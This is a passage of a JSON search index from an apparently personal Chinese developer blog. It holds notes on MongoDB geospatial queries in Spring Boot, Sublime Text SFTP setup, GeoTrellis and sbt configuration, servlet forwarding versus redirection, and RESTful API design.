\u0026#34;page\u0026#34;: 1, \u0026#34;pageSize\u0026#34;: 4, \u0026#34;sortField\u0026#34;: \u0026#34;createTime\u0026#34; }, \u0026#34;pointList\u0026#34;: [ [ -38, -42 ], [ 145, -42 ], [ 145, 63 ], [ -38, 63 ], [ -38, -42 ] ] } 经过多次对 $geoIntersects 的实验，发现几个现象：\n1.经度的查询跨度必须小于180°\n2.如果经度查询跨度大于180°，只会显示出数据库中polygon字段与查询范围相交的记录\n3.但是做了个测试经度范围在-170~140竟然所有的都能查得出来，而且查出来的记录并不在范围内\n查看官网的这句哈可以发现，当超过半个球的时候，他会查询一个互补几何，我猜测可能就是这块橙色区域，所以可以把所有的都查出来\n再做一个测试，框选一个范围，该范围经度跨度大于180°，且包含数据库中的记录下图红框。会发现一个都没查出来，这就可以证实了当经度跨度大于180的时候，他确实找的是红色的这块区域，也即\n(-180°, 180°) - (leftLon, rightLon) 集合区域\n4.经度最大不能超过180°，最小不能少于180°，不然会报错 longitude/latitude is out of bounds\n依据上面的现象完成了针对不同情况的空间查询\nService\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 public JsonResult findByPolygon(SpatialDTO spatialDTO) { List\u0026lt;List\u0026lt;Double\u0026gt;\u0026gt; pointList = spatialDTO.getPointList(); SpecificFindDTO findDTO = spatialDTO.getFindDTO(); Pageable pageable = genericService.getPageable(findDTO); Double leftLon = pointList.get(0).get(0); Double rightLon = pointList.get(2).get(0); Double bottomLat = pointList.get(0).get(1); Double upperLat = pointList.get(2).get(1); String curQueryField = findDTO.getCurQueryField(); if (curQueryField == null || curQueryField.equals(\u0026#34;\u0026#34;)){ curQueryField = \u0026#34;name\u0026#34;; } List\u0026lt;MapClassification\u0026gt; mapClassifications = buildClassifications(findDTO.getMapCLSId()); List\u0026lt;MapItem\u0026gt; mapItemList = null; List\u0026lt;GeoJsonPolygon\u0026gt; queryPolygon = getQueryPolygon(leftLon, rightLon, bottomLat, upperLat); if (queryPolygon.size() == 1){ mapItemList = mapItemDao.findBySearchTextAndPolygonAndPageable( curQueryField, findDTO.getSearchText(), queryPolygon.get(0), mapClassifications, pageable); } else { mapItemList = mapItemDao.findBySearchTextAndPolygonAndPageable( curQueryField, findDTO.getSearchText(), new GeoJsonMultiPolygon(queryPolygon), mapClassifications, pageable); } return ResultUtils.success(mapItemList); } //得到查询的多边形范围 private List\u0026lt;GeoJsonPolygon\u0026gt; getQueryPolygon(double leftLon, double rightLon,double bottomLat,double upperLat){ List\u0026lt;GeoJsonPolygon\u0026gt; polygons = new ArrayList\u0026lt;\u0026gt;(); // 1.先把框选范围移到左边经度大于-180的情况 while (leftLon \u0026lt; -180){ leftLon += 360; rightLon += 360; } // 2.如果右边经度此时小于180的话 // 接着判断经度跨度是否小于180， // 如果小于的话直接通过GeoJsonPolygon查找 // 如果大于的话就把box从中间切开，通过GeoJsonMultiPolygon进行查找 if (rightLon \u0026lt; 180){ polygons.addAll(getQueryPolygon_standard(leftLon,rightLon,bottomLat,upperLat)); } // 3.如果右边经度此时大于等于180的话 // 就要把 \u0026gt;=180 的范围从180°经线切开，形成两个box进行查找 // 分别是 // (leftLon, 179.9) // (-179.9, rightLon-360) // 由于这两个box肯定是符合第二个情况的，所以接下来这两个box分别进行第二步的讨论就行 else { polygons.addAll(getQueryPolygon_standard(leftLon,179.9,bottomLat,upperLat)); polygons.addAll(getQueryPolygon_standard(-179.9,rightLon-360,bottomLat,upperLat)); } return polygons; } //上面的第二个步骤是要多次调用的，单独抽出来 private List\u0026lt;GeoJsonPolygon\u0026gt; getQueryPolygon_standard(Double leftLon, Double rightLon,Double bottomLat,Double upperLat){ List\u0026lt;GeoJsonPolygon\u0026gt; polygons = new ArrayList\u0026lt;\u0026gt;(); if (rightLon - leftLon \u0026lt; 180){ polygons.add(new GeoJsonPolygon( new Point(leftLon,bottomLat),new Point(leftLon,upperLat), new Point(rightLon,upperLat),new Point(rightLon,bottomLat), new Point(leftLon,bottomLat))); }else { double middleLon = (rightLon + leftLon) / 2; polygons.add(new GeoJsonPolygon(new Point(leftLon,bottomLat),new Point(leftLon,upperLat), new Point(middleLon,upperLat),new Point(middleLon,bottomLat),new Point(leftLon,bottomLat))); polygons.add(new GeoJsonPolygon( new Point(middleLon,bottomLat),new Point(middleLon,upperLat), new Point(rightLon,upperLat),new Point(rightLon,bottomLat),new Point(middleLon,bottomLat))); } return polygons; } Dao\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public List\u0026lt;MapItem\u0026gt; findBySearchTextAndPolygonAndPageable( String curQueryField, String searchText, GeoJsonPolygon polygon, List\u0026lt;MapClassification\u0026gt; clsIdList, Pageable pageable) { Query query = new Query(); // query.addCriteria(Criteria.where(\u0026#34;box\u0026#34;).within(box)); query.addCriteria(Criteria.where(curQueryField).regex(searchText)); query.addCriteria(Criteria.where(\u0026#34;polygon\u0026#34;).intersects(polygon)); if (clsIdList.size() != 0) query.addCriteria(Criteria.where(\u0026#34;mapCLS\u0026#34;).in(clsIdList)); return mongoTemplate.find(query.with(pageable), MapItem.class); } public List\u0026lt;MapItem\u0026gt; findBySearchTextAndPolygonAndPageable( String curQueryField, String searchText, GeoJsonMultiPolygon polygon, List\u0026lt;MapClassification\u0026gt; clsIdList, Pageable pageable) { Query query = new Query(); // query.addCriteria(Criteria.where(\u0026#34;box\u0026#34;).within(box)); query.addCriteria(Criteria.where(curQueryField).regex(searchText)); query.addCriteria(Criteria.where(\u0026#34;polygon\u0026#34;).intersects(polygon)); if (clsIdList.size() != 0) query.addCriteria(Criteria.where(\u0026#34;mapCLS\u0026#34;).in(clsIdList)); List\u0026lt;MapItem\u0026gt; mapItemList = mongoTemplate.find(query.with(pageable), MapItem.class); return mapItemList; } MongoDB语法 1 2 3 4 5 6 7 8 9 db.basicScaleMap.find({box:{ $geoWithin: { $geometry: { type: \u0026#34;Polygon\u0026#34;, coordinates: [[[24.482901, -38.771001],[24.482901, 58.526297],[150.443456, 58.526297],[150.443456, -38.771001],[24.482901, -38.771001]]] } }}}) .projection({}) .sort({_id:-1}) .limit(100) 创建空间索引 创建索引\ndb.collection.createIndex(keys, options)\n语法中 Key 值为你要创建的索引字段，1 为指定按升序创建索引，如果你想按降序来创建索引指定为 -1 即可\ndb.col.createIndex({\u0026quot;title\u0026quot;:1})\n创建空间索引\nhttps://docs.mongodb.com/manual/core/2dsphere/\ndb.mapItem.createIndex( { center : \u0026quot;2dsphere\u0026quot; } )\n","permalink":"https://chance7bin.github.io/posts/note/springboot-mongodb-%E7%A9%BA%E9%97%B4%E6%9F%A5%E8%AF%A2/","summary":"引言 https://mongodb.net.cn/manual/geospatial-queries/ 空间查询——查Point元素 查询字段的类型 1 2 // @GeoSpatialIndexed(type = GeoSpatialIndexType.GEO_2DSPHERE) GeoJsonPoint center; // 图像中心点 构造box参数 box格式 [左下，然后右上] 1 Box box = new Box(new Point(-38, -42), new Point(162, 63));","title":"Springboot MongoDB 空间查询"},{"content":" 参考链接\nhttps://www.cnblogs.com/daxuan/p/11014529.html\nhttps://www.jianshu.com/p/0d36cbdecea8\n1.进入到User文件夹下新建一个文件夹当项目目录 C:\\Users\\binbin\\AppData\\Roaming\\Sublime Text\\Packages\\User\n2.打开sublime，关联远程服务器 3.修改配置文件 4.设置完成之后拉取文件 5.新建一个文件，保存后就可以上传到服务器了 6.配置SFTP不被删除 注意：如果退出sublime的时候，SFTP的包被删除，那么要在设置里面加上一句话，这样下次应用就不会删除我们自己手动安装的包了\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;bootstrapped\u0026#34;: true, \u0026#34;in_process_packages\u0026#34;: [ ], \u0026#34;installed_packages\u0026#34;: [ \u0026#34;Package Control\u0026#34;, \u0026#34;SFTP\u0026#34;, ], \u0026#34;remove_orphaned\u0026#34;:false } 7.要注意换行符的问题 Windows文件换行符转Linux换行符\n操作系统文件换行符\n首先介绍下，在ASCII中存在这样两个字符CR（编码为13）和 LF（编码为10），在编程中我们一般称其分别为\u0026rsquo;\\r\u0026rsquo;和\u0026rsquo;\\n\u0026rsquo;。他们被用来作为换行标志，但在不同系统中换行标志又不一样。下面是不同操作系统采用不同的换行符：\nUnix和类Unix（如Linux）：换行符采用 \\n\nWindows和MS-DOS：换行符采用\\r\\n\nMac OS X之前的系统：换行符采用 \\r\nMac OS X：换行符采用 \\n\nLinux中查看换行符\n在Linux中查看换行符的方法应该有很多种，这里介绍两种比较常用的方法。\n第一种使用cat -A [Filename] 查看，如下图所示，看到的为一个Windows形式的换行符，\\r对应符号^M，\\n对应符号$.\nWindows换行符转换为Linux格式\n下面介绍三种方法，选择哪一种看自己喜好，当然你也可以选择第x种，^_^。\n(1)第一种使用VI: 使用VI普通模式打开文件，然后运行命令\u0026quot;set ff=unix\u0026quot; 则可以将Windows 换行符转换为Linux换行符，简单吧！命令中ff的全称为file encoding。\n(2)使用命令dos2unix，如下所示\n1 2 [root@localhost test]# dos2unix gggggggg.txt dos2unix: converting file gggggggg.txt to UNIX format ... 注意(每次上传之后执行dos2unix命令)\n在windows中新建的文件上传到linux上，通过dos2unix转换虽然可行，但是每次在windows修改后换行符都会变成windows的形式，十分不方便，所以一种解决方法是在linux新建文件，在windows上拉取进行更改再上传上去，就可以解决上述问题（好像不太行）\n8.sunlime 软件授权 https://zhuanlan.zhihu.com/p/356913586\n","permalink":"https://chance7bin.github.io/posts/note/sublime-text3-%E9%85%8D%E7%BD%AEsftp/","summary":"参考链接 https://www.cnblogs.com/daxuan/p/11014529.html https://www.jianshu.com/p/0d36cbdecea8 1.进入到User文件夹下新建一个文件夹当项目目录 C:\\Users\\binbin\\AppData\\Roaming\\Sublime Text\\Packages\\User 2.打开sublime，关联远程服务器 3.修改配置文件 4.设置完成之后拉取","title":"Sublime Text3 配置SFTP"},{"content":"什么是GeoTrellis？ GeoTrellis 是一个 Scala 库和框架，它使用 Apache Spark 处理栅格数据。\nGeoTrellis 以尽可能快的速度读取、写入和操作栅格数据。它实现了许多地图代数操作以及矢量到栅格或栅格到矢量的操作。\nGeoTrellis 还提供了将栅格渲染为 PNG 或将有关栅格文件的元数据存储为 JSON 的工具。它旨在通过 RESTful 端点以 Web 速度（亚秒或更短）提供栅格处理，并提供大型栅格数据集的快速批处理。\n为什么是GeoTrellis？ 栅格处理传统上是一项缓慢的任务，这促使矢量数据处理作为替代方案的进步。然而，随着每年越来越多的卫星数据被公开，栅格数据不会随处可见。 GeoTrellis 是对不断增长的大规模栅格处理需求的一种解决方案。\n配置开发环境 1.安装scala（2.12.10）、sbt并配置环境变量 2.sbt 设置仓库地址步骤 在SBT_HOME\\sbt\\conf下新建repository.properties文件，内容如下\n1 2 3 4 5 [repositories] local ali: https://maven.aliyun.com/nexus/content/repositories/central/ 1 2 3 4 5 6 7 [repositories] local aliyun: http://maven.aliyun.com/nexus/content/groups/public typesafe-ivy-releases: http://repo.typesafe.com/typesafe/ivy-releases/, [organization]/[module]/[revision]/[type]s/[artifact](-[classifier]).[ext], bootOnly sonatype-oss-releases maven-central sonatype-oss-snapshots 修改sbtconfig.txt文件，加上如下内容:\n1 2 3 4 5 6 -Dsbt.log.format=true -Dsbt.boot.directory=E:/dev_tools/sbt/.sbt/boot -Dsbt.ivy.home=E:/dev_tools/sbt/.ivy2 -Dsbt.global.base=E:/dev_tools/sbt/.sbt -Dsbt.repository.config=E:/dev_tools/sbt/conf/repository.properties 这些是设置sbt下载项目依赖目录。\n3.IDEA安装Scala插件 4.sbt换源，解决速度慢的问题 https://segmentfault.com/a/1190000021817234\n根据官方文档，首先要设置sbt.override.build.repos为true才能换源。设置以后sbt就会读取~/.sbt/repositories文件中的[repositories]部分。\n设置方法（适用于Windows）就是将sbt安装目录下的conf/sbtconfig.txt中增加一行JVM启动参数 -Dsbt.override.build.repos=true\n而对于Intellij Idea，则是在设置中sbt页面的VM Parameters中增加同样的一行启动配置 -Dsbt.override.build.repos=true\n这里给出我的配置文件，使用的是阿里云的maven仓库，保存的路径为~/.sbt/repositories\n1 2 3 4 5 6 7 8 [repositories] local aliyun: https://maven.aliyun.com/repository/public typesafe: https://repo.typesafe.com/typesafe/ivy-releases/, [organization]/[module]/(scala_[scalaVersion]/)(sbt_[sbtVersion]/)[revision]/[type]s/[artifact](-[classifier]).[ext], bootOnly ivy-sbt-plugin:https://dl.bintray.com/sbt/sbt-plugin-releases/, [organization]/[module]/(scala_[scalaVersion]/)(sbt_[sbtVersion]/)[revision]/[type]s/[artifact](-[classifier]).[ext] sonatype-oss-releases maven-central sonatype-oss-snapshots 5.IDEA创建项目 ①新建项目\n②选择File-\u0026gt;project Structure\n左边选择Modules 右边选择Sources，将src目录Mark as Sources后就可以在src下新建Scala类了\n然后右边继续选择Dependencies，点击+号，添加Scala类库\n前面的勾要勾选上\n③修改sbt构建设置\n修改sbt构建设置，其中VM parameters配置为\n1 2 3 4 5 6 7 8 -Xmx512M -XX:MaxPermSize=256m -XX:ReservedCodeCacheSize=128m -Dsbt.log.format=true -Dsbt.ivy.home=E:/dev_tools/sbt/.ivy2 -Dsbt.global.base=E:/dev_tools/sbt/.sbt -Dsbt.repository.config=E:/dev_tools/sbt/conf/repository.properties ④关于新建sbt task的步骤和设置\n选择run-\u0026gt;edit configuration,点击左上角+号，选择sbt task\ntasks输入:~run\nVM parameters输入:\n1 2 3 4 5 6 7 8 9 -Xms512M -Xmx1024M -Xss1M -XX:+CMSClassUnloadingEnabled -Dsbt.log.format=true -Dsbt.boot.directory=E:/dev_tools/sbt/.sbt/boot -Dsbt.ivy.home=E:/dev_tools/sbt/.ivy2 -Dsbt.global.base=E:/dev_tools/sbt/.sbt -Dsbt.repository.config=E:/dev_tools/sbt/conf/repository.properties ⑤创建文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main.scala /** * @Description * @Author bin * @Date 2021/12/18 */ object Test extends App { val ages = Seq(42, 75, 29, 64) println(s\u0026#34;The oldest person is ${ages.max}\u0026#34;) } object Test { def main(args: Array[String]) : Unit = { val msg = \u0026#34;hello world\u0026#34; println(msg) } } 运行的时候出现如下错误：\nBuild出现如下错误：\nExtracting structure failed, reason: not ok build status:\n==上面http换成https之后就没有报这个错误了==\nGeoTrellis使用 1.入门 教程\n拉官网给的代码运行\n打开项目后先build一下，这个步骤要花费不少的时间\n然后copy如下代码进行测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package demo import geotrellis.raster._ import geotrellis.raster.mapalgebra.focal.Square import geotrellis.spark._ object Main { def helloSentence = \u0026#34;Hello GeoTrellis\u0026#34; def helloRaster(): Unit = { val nd = NODATA //-2147483648 val input = Array[Int]( nd, 7, 1, 1, 3, 5, 9, 8, 2, 9, 1, 1, 2, 2, 2, 4, 3, 5, 3, 8, 1, 3, 3, 3, 1, 2, 2, 2, 4, 7, 1, nd, 1, 8, 4, 3) //将数组转化为4*9矩阵 val iat = IntArrayTile(input, 9, 4) //用一个n*n的窗口对矩阵做卷积，设中心值为平均值 //Square(i) =\u0026gt; n = 2 * i + 1 val focalNeighborhood = Square(1) println(focalNeighborhood) val meanTile = iat.focalMean(focalNeighborhood) for (i \u0026lt;- 0 to 3) { for (j \u0026lt;- 0 to 8) { print(meanTile.getDouble(j, i) + \u0026#34; \u0026#34;) } println() } } def main(args: Array[String]): Unit = { helloRaster() } } 2.读本地Geotiff文件 一共四行代码\n1 2 3 4 5 import geotrellis.raster.io.geotiff.reader.GeoTiffReader import geotrellis.raster.io.geotiff._ val path: String = \u0026#34;filepath/filename.tif\u0026#34; val geoTiff: SinglebandGeoTiff = GeoTiffReader.readSingleband(path) 这种方法用于读取但波段tif影像，要读取多波段影像，可以用\n1 val geoTiff: MultibandGeoTiff = GeoTiffReader.readMultiband(path) 如果强行用GeoTiffReader.readSingleband(path)方法去读取一个多波段影像，则最后的返回结果是一个单波段影像，且其中的数据为原始影像中的第一个波段。\n此外，也可以用影像路径为参数直接构造一个Geotiff对象\n1 2 3 import geotrellis.raster.io.geotiff.SinglebandGeoTiff val geoTiff: SinglebandGeoTiff = SinglebandGeoTiff(path) 3.发布TMS服务 akka scala的akka框架有一个极简的http service组件，是把原来spray框架集成到akka里面修改而成。\nWebServer.scala\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package demo import akka.actor.ActorSystem import akka.http.javadsl.server.Route import akka.http.scaladsl.Http//http().bindandhandle import akka.http.scaladsl.model.{ContentTypes, HttpEntity} import akka.stream.ActorMaterializer import scala.io.StdIn import akka.http.scaladsl.model._ import akka.http.scaladsl.server.Directives._//path/get/complete import akka.http.scaladsl.server.Directive0 import akka.http.scaladsl.server.Route /** * @Description * @Author bin * @Date 2021/12/20 */ object WebServer { def main(args: Array[String]): Unit = { implicit val system = ActorSystem(\u0026#34;my-system\u0026#34;) implicit val materilizer = ActorMaterializer() implicit val executionContext = system.dispatcher lazy val route = path(\u0026#34;register\u0026#34;){ get { complete(HttpEntity(ContentTypes.`text/html(UTF-8)`, \u0026#34;\u0026lt;h1\u0026gt;Welcome to register my project\u0026lt;/h1\u0026gt;\u0026#34;)) } } val bindingFuture = Http().bindAndHandle(route,\u0026#34;localhost\u0026#34;,8080) println(s\u0026#34;Server online at http://localhost:8080/\\nPress RETURN to stop...\u0026#34;) StdIn.readLine() bindingFuture //.flatMap(_.unbind()) .onComplete(_ =\u0026gt; system.terminate()) } } 配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // Rename this as you see fit name := \u0026#34;geotrellis-sbt-template\u0026#34; version := \u0026#34;0.2.0\u0026#34; scalaVersion := \u0026#34;2.11.12\u0026#34; lazy val akkaHttpVersion = \u0026#34;10.0.11\u0026#34; lazy val akkaVersion = \u0026#34;2.5.8\u0026#34; lazy val root = (project in file(\u0026#34;.\u0026#34;)) .settings( inThisBuild(List( organization :=\u0026#34;com.example\u0026#34;, scalaVersion :=\u0026#34;2.12.4\u0026#34; )), name := \u0026#34;My-first-akka-http-project\u0026#34;, libraryDependencies ++= Seq( \u0026#34;com.typesafe.akka\u0026#34; %% \u0026#34;akka-http\u0026#34; % akkaHttpVersion, \u0026#34;com.typesafe.akka\u0026#34; %% \u0026#34;akka-http-spray-json\u0026#34; % akkaHttpVersion, \u0026#34;com.typesafe.akka\u0026#34; %% \u0026#34;akka-http-xml\u0026#34; % akkaHttpVersion, \u0026#34;com.typesafe.akka\u0026#34; %% \u0026#34;akka-stream\u0026#34; % akkaVersion, ) ) geotrellis-landsat-tutorial 以官网的例子为例，跑一个demo\n做数据处理的时候报了如下错误，看来还是要先了解一下hadoop\n","permalink":"https://chance7bin.github.io/posts/note/geotrellis/","summary":"什么是GeoTrellis？ GeoTrellis 是一个 Scala 库和框架，它使用 Apache Spark 处理栅格数据。 GeoTrellis 以尽可能快的速度读取、写入和操作栅格数据。它实现了许多地图代数操作","title":"GeoTrellis"},{"content":"转发和重定向区别详解 作为一名java web开发的程序员，在使用servlet/jsp的时候，我们必须要知道实现页面跳转的两种方式的区别和联系：即转发和重定向的区别。\n1、request.getRequestDispatcher().forward()方法,只能将请求转发给同一个WEB应用中的组件；而response.sendRedirect() 方法不仅可以重定向到当前应用程序中的其他资源，还可以重定向到同一个站点上的其他应用程序中的资源，甚至是使用绝对URL重定向到其他站点的资源。\n如果传递给response.sendRedirect()方法的相对URL以“/”开头，它是相对于整个WEB站点的根目录；如果创建request.getRequestDispatcher()对象时指定的相对URL以“/”开头，它是相对于当前WEB应用程序的根目录。\n2、重定向访问过程结束后，浏览器地址栏中显示的URL会发生改变，由初始的URL地址变成重定向的目标URL；请求转发过程结束后，浏览器地址栏保持初始的URL地址不变。\n3、HttpServletResponse.sendRedirect方法对浏览器的请求直接作出响应，响应的结果就是告诉浏览器去重新发出对另外一个URL的访问请求，这个过程好比有个绰号叫“浏览器”的人写信找张三借钱，张三回信说没有钱，让“浏览器”去找李四借，并将李四现在的通信地址告诉给了“浏览器”。于是，“浏览器”又按张三提供通信地址给李四写信借钱，李四收到信后就把钱汇给了“浏览器”。\n由此可见，重定向的时候，“浏览器”一共发出了两封信和收到了两次回复，“浏览器”也知道他借到的钱出自李四之手。\nrequest.getRequestDispatcher().forward()方法在服务器端内部将请求转发给另外一个资源，浏览器只知道发出了请求并得到了响应结果，并不知道在服务器程序内部发生了转发行为。这个过程好比绰号叫“浏览器”的人写信找张三借钱，张三没有钱，于是张三找李四借了一些钱，甚至还可以加上自己的一些钱，然后再将这些钱汇给了“浏览器”。\n由此可见，转发的时候，“浏览器”只发 出了一封信和收到了一次回复，他只知道从张三那里借到了钱，并不知道有一部分钱出自李四之手。\n4、request.getRequestDispatcher().forward()方法的调用者与被调用者之间共享相同的request对象和response对象，它们属于同一个访问请求和响应过程；\n而response.sendRedirect()方法调用者与被调用者使用各自的request对象和response对象，它们属于两个独立的访问请求和响应过程。对于同一个WEB应用程序的内部资源之间的跳转，特别是跳转之前要对请求进行一些前期预处理，并要使用HttpServletRequest.setAttribute方法传递预处理结果，那就应该使用request.getRequestDispatcher().forward()方法。不同WEB应用程序之间的重定向，特别是要重定向到另外一个WEB站点上的资源的情况，都应该使用response.sendRedirect()方法。\n5、无论是request.getRequestDispatcher().forward()方法，还是response.sendRedirect()方法，在调用它们之前，都不能有内容已经被实际输出到了客户端。如果缓冲区中已经有了一些内容，这些内容将被从缓冲区中。\n以上五点的论述来源于：点击查看原文论述\n转发和重定向的图解 两种跳转获得对象的方式 1 2 3 4 5 6 //获得转发对象getRequestDispatcher() HttpServletRequest(httpServletRequest).getRequestDispatcher ServletContext.getRequestDispatcher(); //获得重定向对象sendRedirect() HttpServletResponse(httpServletResponse).sendRedirect(); 转发和跳转的小结 1、转发使用的是getRequestDispatcher()方法;重定向使用的是sendRedirect();\n2、转发：浏览器URL的地址栏不变。重定向：浏览器URL的地址栏改变；\n3、转发是服务器行为，重定向是客户端行为；\n4、转发是浏览器只做了一次访问请求。重定向是浏览器做了至少两次的访问请求；\n5、转发2次跳转之间传输的信息不会丢失，重定向2次跳转之间传输的信息会丢失（request范围）。\n转发和重定向的选择 1、重定向的速度比转发慢，因为浏览器还得发出一个新的请求，如果在使用转发和重定向都无所谓的时候建议使用转发。\n2、因为转发只能访问当前WEB的应用程序，所以不同WEB应用程序之间的访问，特别是要访问到另外一个WEB站点上的资源的情况，这个时候就只能使用重定向了。\n转发和重定向的应用场景 在上面我已经提到了，转发是要比重定向快，因为重定向需要经过客户端，而转发没有。有时候，采用重定向会更好，若需要重定向到另外一个外部网站，则无法使用转发。另外，重定向还有一个应用场景：避免在用户重新加载页面时两次调用相同的动作。\n例如，当提交产品表单的时候，执行保存的方法将会被调用，并执行相应的动作；这在一个真实的应用程序中，很有可能将表单中的所有产品信息加入到数据库中。但是如果在提交表单后，重新加载页面，执行保存的方法就很有可能再次被调用。同样的产品信息就将可能再次被添加，为了避免这种情况，提交表单后，你可以将用户重定向到一个不同的页面，这样的话，这个网页任意重新加载都没有副作用；\n但是，使用重定向不太方便的地方是，使用它无法将值轻松地传递给目标页面。而采用转发，则可以简单地将属性添加到Model,使得目标视图可以轻松访问。由于重定向经过客户端，所以Model中的一切都会在重定向时丢失。但幸运的是，在Spring3.1版本以后，我们可以通过Flash属性，解决重定向时传值丢失的问题。\n要使用Flash属性，必须在Spring MVC的配置文件中添加一个\u0026lt;annotation-driven/\u0026gt;。然后，还必须再方法上添加一个新的参数类型：org.springframework.web.servlet.mvc.support.RedirectAttributes。\n如下所示：\n1 2 3 4 5 6 7 8 9 10 11 @RequestMapping(value=\u0026#34;saveProduct\u0026#34;,method=RequestMethod.POST) public String saveProduct(ProductForm productForm,RedirectAttributes redirectAttributes){ //执行产品保存的业务逻辑等 //传递参数 redirectAttributes.addFlashAttribute(\u0026#34;message\u0026#34;,\u0026#34;The product is saved successfully\u0026#34;); //执行重定向 return \u0026#34;redirect:/……\u0026#34;; } 一、请求转发和重定向 请求转发： request.getRequestDispatcher(URL地址).forward(request, response)\n处理流程：\n客户端发送请求，Servlet做出业务逻辑处理。 Servlet调用forword()方法，服务器Servlet把目标资源返回给客户端浏览器。 2）重定向： response.sendRedirect(URL地址)\n处理流程：\n客户端发送请求，Servlet做出业务逻辑处理。 Servlet调用response.sendReadirect()方法，把要访问的目标资源作为response响应头信息发给客户端浏览器。 客户端浏览器重新访问服务器资源xxx.jsp，服务器再次对客户端浏览器做出响应。 以上两种情况，你都需要考虑Servlet处理完后，数据如何在jsp页面上呈现。图例是请求、响应的流程，没有标明数据如何处理、展现。\n二、转发和重定向的路径问题 1）使用相对路径在重定向和转发中没有区别\n2）重定向和请求转发使用绝对路径时，根/路径代表了不同含义\n重定向response.sendRedirect(\u0026ldquo;xxx\u0026rdquo;)是服务器向客户端发送一个请求头信息，由客户端再请求一次服务器。/指的Tomcat的根目录,写绝对路径应该写成\u0026quot;/当前Web程序根名称/资源名\u0026quot; 。如\u0026quot;/WebModule/login.jsp\u0026quot;,\u0026quot;/bbs/servlet/LoginServlet\u0026quot;\n转发是在服务器内部进行的，写绝对路径/开头指的是当前的Web应用程序。绝对路径写法就是\u0026quot;/login.jsp\u0026quot;或\u0026quot;/servlet/LoginServlet\u0026quot;。\n总结：以上要注意是区分是从服务器外的请求，还在是内部转发，从服务器外的请求，从Tomcat根写起(就是要包括当前Web的根)；是服务器内部的转发，很简单了，因为在当前服务器内，/写起指的就是当前Web的根目录。\n三、转发和重定向的区别 request.getRequestDispatcher()是容器中控制权的转向，在客户端浏览器地址栏中不会显示出转向后的地址；服务器内部转发，整个过程处于同一个请求当中。response.sendRedirect()则是完全的跳转，浏览器将会得到跳转的地址，并重新发送请求链接。这样，从浏览器的地址栏中可以看到跳转后的链接地址。不在同一个请求。重定向，实际上客户端会向服务器端发送两个请求。所以转发中数据的存取可以用request作用域：request.setAttribute(), request.getAttribute()，重定向是取不到request中的数据的。只能用session。 forward()更加高效，在可以满足需要时，尽量使用RequestDispatcher.forward()方法。（思考一下为什么？） RequestDispatcher是通过调用HttpServletRequest对象的getRequestDispatcher()方法得到的，是属于请求对象的方法。sendRedirect()是HttpServletResponse对象的方法，即响应对象的方法，既然调用了响应对象的方法，那就表明整个请求过程已经结束了，服务器开始向客户端返回执行的结果。 重定向可以跨域访问，而转发是在web服务器内部进行的，不能跨域访问。 ","permalink":"https://chance7bin.github.io/posts/note/%E8%BD%AC%E5%8F%91%E5%92%8C%E9%87%8D%E5%AE%9A%E5%90%91/","summary":"转发和重定向区别详解 作为一名java web开发的程序员，在使用servlet/jsp的时候，我们必须要知道实现页面跳转的两种方式的区别和联系","title":"转发和重定向"},{"content":"restful风格API 设计指南 一、协议 API与用户的通信协议，总是使用HTTPs协议。\n二、域名 应该尽量将API部署在专用域名之下。\nhttps://api.example.com\n如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。\nhttps://example.org/api/\n三、版本（Versioning） 应该将API的版本号放入URL。\nhttps://api.example.com/v1/\n另一种做法是，将版本号放在HTTP头信息中，但不如放入URL方便和直观。Github采用这种做法。\n四、路径（Endpoint） 路径又称\u0026quot;终点\u0026quot;（endpoint），表示API的具体网址。\n在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的\u0026quot;集合\u0026quot;（collection），所以API中的名词也应该使用复数。\n举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。\nhttps://api.example.com/v1/zoos\nhttps://api.example.com/v1/animals\nhttps://api.example.com/v1/employees\n五、HTTP动词 对于资源的具体操作类型，由HTTP动词表示。\n常用的HTTP动词有下面五个（括号里是对应的SQL命令）。\nGET（SELECT）：从服务器取出资源（一项或多项）。\nPOST（CREATE）：在服务器新建一个资源。\nPUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。\nPATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。\nDELETE（DELETE）：从服务器删除资源。\n还有两个不常用的HTTP动词。\nHEAD：获取资源的元数据。\nOPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。\n下面是一些例子。\nGET /zoos：列出所有动物园\nPOST /zoos：新建一个动物园\nGET /zoos/ID：获取某个指定动物园的信息\nPUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息）\nPATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）\nDELETE /zoos/ID：删除某个动物园\nGET /zoos/ID/animals：列出某个指定动物园的所有动物\nDELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物\n六、过滤信息（Filtering） 如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。\n下面是一些常见的参数。\n?limit=10：指定返回记录的数量\n?offset=10：指定返回记录的开始位置。\n?page=2\u0026amp;per_page=100：指定第几页，以及每页的记录数。\n?sortby=name\u0026amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。\n?animal_type_id=1：指定筛选条件\n参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。\n七、状态码（Status Codes） 